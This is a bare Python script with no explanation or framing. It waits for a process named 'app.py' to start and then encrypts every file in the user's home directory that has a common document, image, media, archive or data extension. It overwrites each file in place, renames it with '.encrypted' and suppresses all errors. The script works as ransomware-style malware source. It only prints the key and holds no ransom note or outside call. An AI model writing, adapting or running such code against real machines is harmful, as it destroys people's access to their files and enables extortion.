import os
import psutil
import time
from cryptography.fernet import Fernet
from pathlib import Path

def get_encryption_key():
    return Fernet.generate_key()

def encrypt_file(file_path, key):
    try:
        f = Fernet(key)
        with open(file_path, 'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(file_path, 'wb') as file:
            file.write(encrypted_data)
        os.rename(file_path, str(file_path) + '.encrypted')
    except:
        pass

def is_app_py_running():
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            cmdline = proc.info['cmdline']
            if cmdline and any('app.py' in arg for arg in cmdline):
                return True
        except:
            continue
    return False

def encrypt_all_files(key):
    extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif', '.mp3', '.mp4', '.mov', '.zip', '.rar', '.csv', '.json', '.xml']
    home = Path.home()
    for ext in extensions:
        for file_path in home.rglob('*' + ext):
            if file_path.is_file() and '.encrypted' not in str(file_path):
                encrypt_file(file_path, key)

def main():
    key = get_encryption_key()
    print(key.decode())
    running = False
    
    while True:
        if is_app_py_running():
            if not running:
                running = True
                encrypt_all_files(key)
        else:
            if running:
                break
        time.sleep(1)

if __name__ == '__main__':
    main()
